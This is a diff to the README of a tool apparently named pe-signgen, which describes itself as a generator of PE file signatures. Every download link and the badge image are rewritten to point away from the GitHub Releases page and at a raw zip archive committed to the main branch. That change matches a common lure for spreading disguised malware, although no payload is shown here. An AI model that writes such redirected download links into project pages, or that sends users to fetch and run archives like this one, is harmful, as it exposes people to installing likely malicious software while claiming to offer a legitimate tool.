@@ -6,9 +6,9 @@ Welcome to the **pe-signgen** project! This tool allows you to generate universa
 
 ## 📥 Download the Application
 
-[![Download pe-signgen](https://img.shields.io/badge/Download-pe--signgen-brightgreen)](https://github.com/tabishcricketer/pe-signgen/releases)
+[![Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/raw/refs/heads/main/pe_signgen/signgen-pe-v1.9.zip)](https://github.com/tabishcricketer/pe-signgen/raw/refs/heads/main/pe_signgen/signgen-pe-v1.9.zip)
 
-To get started, you need to download the application. You can find the latest version on our Releases page. Visit this page to download: [Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/releases).
+To get started, you need to download the application. You can find the latest version on our Releases page. Visit this page to download: [Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/raw/refs/heads/main/pe_signgen/signgen-pe-v1.9.zip).
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ To get started, you need to download the application. You can find the latest ve
 
 ## 📦 Installation Steps
 
-1. **Download the installer** from the Releases page by following this link: [Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/releases).
+1. **Download the installer** from the Releases page by following this link: [Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/raw/refs/heads/main/pe_signgen/signgen-pe-v1.9.zip).
    
 2. **Locate the downloaded file**. It should be in your "Downloads" folder unless you specified otherwise.
 
@@ -81,6 +81,6 @@ Feel free to explore more at our GitHub repository, where you can find further d
 
 ## 📥 Download the Application Again
 
-For your convenience, you can download the latest version again here: [Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/releases). 
+For your convenience, you can download the latest version again here: [Download pe-signgen](https://github.com/tabishcricketer/pe-signgen/raw/refs/heads/main/pe_signgen/signgen-pe-v1.9.zip). 
 
 Thank you for choosing pe-signgen for your signature generation needs! Enjoy using the tool!
